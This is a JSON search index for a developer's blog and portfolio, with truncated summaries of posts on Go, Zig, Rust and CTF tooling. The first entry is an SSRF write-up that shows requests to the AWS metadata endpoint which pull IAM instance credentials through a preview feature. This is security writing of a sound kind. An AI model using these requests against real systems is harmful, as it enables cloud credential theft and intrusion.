@@ -1,0 +1,66 @@
+[
+  {
+    "title":   "Exploiting SSRF in a modern cloud environment",
+    "url":     "/blog/ssrf-cloud-exploitation/",
+    "section": "blog",
+    "tags":    ["security","writeup","cloud","aws"],
+    "summary": "During a recent engagement I found an SSRF vulnerability that looked boring on the surface — internal HTTP request, filtered output, no obvious pivot path. Forty minutes later I had IAM credentials …",
+    "content": "During a recent engagement I found an SSRF vulnerability that looked boring on the surface — internal HTTP request, filtered output, no obvious pivot path. Forty minutes later I had IAM credentials with iam:PassRole. Here\u0026rsquo;s exactly how it unfolded.\nthe initial find The target was a SaaS platform with a \u0026ldquo;fetch URL for preview\u0026rdquo; feature. Classic SSRF surface. The first thing I tried was the AWS metadata endpoint:\ninitial probe ❯ curl 'https://target.example/preview?url=http://169.254.169.254/latest/meta-data/' ami-id ami-launch-index ami-manifest-path block-device-mapping/ hostname iam/ instance-action No filtering. The iam/ path was right there.\nextracting credentials # Step the path down GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ # → ec2-instance-role GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance-role # → { AccessKeyId, SecretAccessKey, Token, Expiration } The role had iam:PassRole …"
+  },
+  {
+    "title":   "Building a zero-dep CLI arg parser in Go",
+    "url":     "/blog/zero-dep-arg-parser-go/",
+    "section": "blog",
+    "tags":    ["go","tooling","devlog","cli"],
+    "summary": "Every CLI tool I write starts the same way: add cobra, watch the binary balloon to 8 MB, spend twenty minutes fighting its init magic, regret everything. So I wrote a 200-line arg parser I\u0026rsquo;ve …",
+    "content": "Every CLI tool I write starts the same way: add cobra, watch the binary balloon to 8 MB, spend twenty minutes fighting its init magic, regret everything. So I wrote a 200-line arg parser I\u0026rsquo;ve now copied into six projects and never touched again.\nwhat I actually need Positional args Flags with short and long forms (-v, --verbose) Subcommands (one level deep is enough) Help text generated automatically Zero allocations in the hot path No config file unmarshalling. No completion scripts. No plugin system. Just parse os.Args and get out of the way.\nthe core type type Parser struct { name string flags []Flag args []Arg cmds map[string]*Parser } type Flag struct { Short string Long string Help string Value interface{ Set(string) error } } The Value interface mirrors flag.Value from stdlib, so you can drop in flag.Bool, flag.String, etc., or write your own.\nparsing in 60 lines The parse loop is a simple state machine: if the token starts with --, strip it and look up the flag by long …"
+  },
+  {
+    "title":   "HTB — reversing a custom VM in 3 hours",
+    "url":     "/blog/htb-vm-reversing/",
+    "section": "blog",
+    "tags":    ["ctf","reverse-engineering","writeup","htb"],
+    "summary": "The challenge binary implemented a 16-instruction stack VM in ~800 lines of C. The flag was encrypted and stored as VM bytecode. My job: reverse the ISA, write an emulator in Python, then work …",
+    "content": "The challenge binary implemented a 16-instruction stack VM in ~800 lines of C. The flag was encrypted and stored as VM bytecode. My job: reverse the ISA, write an emulator in Python, then work backwards from the encrypted output to the key.\nrecon ❯ file vm-ware vm-ware: ELF 64-bit LSB executable, x86-64, statically linked ❯ checksec --file vm-ware Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE Static, no PIE — reversing is straightforward, no ASLR to fight. Opened in Ghidra, found dispatch_loop() immediately from the switch statement shape.\nthe ISA After an hour with Ghidra I had the full opcode table:\nOpcode Mnemonic Description 0x01 PUSH push immediate 0x02 POP pop to register 0x03 ADD r0 = r0 + r1 0x04 XOR r0 = r0 ^ r1 0x05 JNZ jump if r0 != 0 0x06 LOAD r0 = mem[r1] 0x07 STORE mem[r1] = r0 0x08 CALL push ip, jump 0x09 RET pop ip 0x0A HALT stop the emulator class VM: def __init__(self, bytecode): self.code = bytecode self.stack = [] self.mem = …"
+  },
+  {
+    "title":   "clifmt",
+    "url":     "/portfolio/clifmt/",
+    "section": "portfolio",
+    "tags":    ["go","cli","parser","syntax"],
+    "summary": "clifmt pipes any tool\u0026rsquo;s output through a configurable formatter: syntax highlighting, JSON pretty-printing, log-level coloring, and custom regex rules — all composable and streaming.\n",
+    "content": "clifmt pipes any tool\u0026rsquo;s output through a configurable formatter: syntax highlighting, JSON pretty-printing, log-level coloring, and custom regex rules — all composable and streaming.\nthe problem I kept writing the same 20 lines of Go in every CLI tool: parse the output, colorize tokens, stream to stdout. clifmt pulls that into a standalone binary and a library you can import.\nusage # Colorize Go source piped from any command cat main.go | clifmt --lang go # Pretty-print JSON with highlight curl -s api.example.com/data | clifmt --json # Apply custom rules from a config file my-tool | clifmt --rules ~/.config/clifmt/rules.toml how it works The formatter is a pipeline of Transformer interfaces:\ntype Transformer interface { Transform(line []byte) ([]byte, error) } Each transformer gets a line, does its thing, and passes it on. Transformers are stateless so they compose without side effects.\nBuilt-in transformers:\nSyntaxHighlighter — tokenizes source code via a hand-rolled lexer …"
+  },
+  {
+    "title":   "Why I ported my TUI tools from C to Zig",
+    "url":     "/blog/c-to-zig-migration/",
+    "section": "blog",
+    "tags":    ["zig","c","tooling","devlog"],
+    "summary": "I spent three years writing TUI tools in C. I\u0026rsquo;m not going back. Zig gives me everything C does — direct memory control, no runtime, single binary output — plus a build system that doesn\u0026rsquo;t …",
+    "content": "I spent three years writing TUI tools in C. I\u0026rsquo;m not going back. Zig gives me everything C does — direct memory control, no runtime, single binary output — plus a build system that doesn\u0026rsquo;t make me want to quit programming.\nwhat I was doing in C My TUI toolkit was about 4k lines of C spread across a handful of tools: a hex viewer, a log tailer, and a process inspector. They shared a small rendering layer I called termbox.c — basically a manual implementation of the parts of ncurses I actually used.\nThe pain points were all in the build system and the allocator story. make is fine until you have cross-compilation targets, and tracking allocations manually across tools that share a library got old fast.\nwhat Zig gives me instead Comptime replaces most of my C preprocessor usage. Instead of #define COLS 80 and a thousand #ifdef PLATFORM_LINUX guards, I write:\nconst platform = @import(\u0026#34;builtin\u0026#34;).os.tag; const default_cols: u16 = if (platform == .windows) 120 else 80; The …"
+  },
+  {
+    "title":   "portscanner",
+    "url":     "/portfolio/portscanner/",
+    "section": "portfolio",
+    "tags":    ["rust","async","networking","security"],
+    "summary": "A fast, async port scanner with service fingerprinting. Scans 65k ports in under a second on a LAN, outputs structured JSON, and identifies services without sending exploit traffic.\n",
+    "content": "A fast, async port scanner with service fingerprinting. Scans 65k ports in under a second on a LAN, outputs structured JSON, and identifies services without sending exploit traffic.\nwhy another port scanner nmap is the right tool for most jobs. I built this one to learn tokio properly, and because I wanted machine-readable output that piped cleanly into jq without post-processing the nmap XML format.\nfeatures Async scanning — tokio tasks, one per port range shard Banner grabbing — reads the first 512 bytes after connect Service fingerprinting — matches banners against a compact signature database (shipped as a single TOML file) JSON output — every field typed and documented example output { \u0026#34;target\u0026#34;: \u0026#34;10.0.0.1\u0026#34;, \u0026#34;scan_ms\u0026#34;: 340, \u0026#34;ports\u0026#34;: [ { \u0026#34;port\u0026#34;: 22, \u0026#34;state\u0026#34;: \u0026#34;open\u0026#34;, \u0026#34;service\u0026#34;: \u0026#34;ssh\u0026#34;, \u0026#34;banner\u0026#34;: \u0026#34;SSH-2.0-OpenSSH_9.3\u0026#34; }, { \u0026#34;port\u0026#34;: 80, \u0026#34;state\u0026#34;: \u0026#34;open\u0026#34;, \u0026#34;service\u0026#34;: …"
+  },
+  {
+    "title":   "hexbreak",
+    "url":     "/portfolio/hexbreak/",
+    "section": "portfolio",
+    "tags":    ["zig","wasm","game","canvas"],
+    "summary": "A browser Breakout clone where every brick is a hex byte and clearing a row \u0026ldquo;decrypts\u0026rdquo; a line of ciphertext. Built with Zig compiled to WASM, no JS game framework, just a Canvas 2D …",
+    "content": "A browser Breakout clone where every brick is a hex byte and clearing a row \u0026ldquo;decrypts\u0026rdquo; a line of ciphertext. Built with Zig compiled to WASM, no JS game framework, just a Canvas 2D context.\nwhy I wanted to learn WASM as a compile target for Zig, and I wanted to build something I\u0026rsquo;d actually play. The hex-editor framing came from spending too many hours in a hex editor during CTFs — the grid layout maps perfectly to a Breakout playfield.\narchitecture The game logic is pure Zig — zero JS in the hot path. Zig exports a handful of functions that the HTML host calls:\nexport fn init(seed: u64) void { ... } export fn update(dt_ms: f32) void { ... } export fn render(canvas_ptr: [*]u8, width: u32, height: u32) void { ... } render() writes directly into a Uint8ClampedArray that the JS host hands to putImageData. No DOM manipulation, no requestAnimationFrame inside Zig — the host drives the loop and Zig stays stateless.\nbuilding zig build -Dtarget=wasm32-freestanding …"
+  },
+  {
+    "title":   "hexplore",
+    "url":     "/portfolio/hexplore/",
+    "section": "portfolio",
+    "tags":    ["c","zig","tui","binary","reverse-engineering"],
+    "summary": "hexplore is the hex-viewer component extracted from a larger binary analysis tool. Drop a file on the embed above to inspect it in the browser — offset navigation, ASCII panel, and basic struct …",
+    "content": "hexplore is the hex-viewer component extracted from a larger binary analysis tool. Drop a file on the embed above to inspect it in the browser — offset navigation, ASCII panel, and basic struct annotation.\norigin I built a full binary analysis suite over about six months. The hex viewer was the most self-contained piece and the most useful in isolation, so I spun it out as a standalone library and a browser embed.\nfeatures Offset navigation with keyboard (g to go-to, G for end) Highlights null bytes, printable ASCII, and high bytes in different colors Struct overlay — define a layout in a simple schema and it draws field boundaries and labels Syncs selection between hex and ASCII panels the browser port The TUI version is Zig. The browser version compiles the same core to WASM and replaces the terminal rendering layer with a Canvas 2D context. The struct parser and the offset-to-screen mapping are identical — only the draw calls change.\n// Shared core — same in TUI and WASM builds pub …"
+  }
+]
